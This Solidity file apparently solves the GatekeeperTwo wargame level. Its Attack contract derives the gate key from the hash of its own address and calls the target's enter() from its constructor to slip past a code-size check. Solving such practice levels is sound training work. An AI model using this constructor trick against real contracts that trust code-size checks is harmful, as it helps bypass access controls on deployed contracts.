// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./console.sol";
import "./GatekeeperTwo.sol";
contract Attack {
    bytes8 gatekey;
constructor(address _gatekeeper){
    GatekeeperTwo  gatekeepertwo;
    gatekeepertwo=GatekeeperTwo(_gatekeeper);
    gatekey=bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this)))))^type(uint64).max);
    gatekeepertwo.enter(gatekey);
}
 
}

 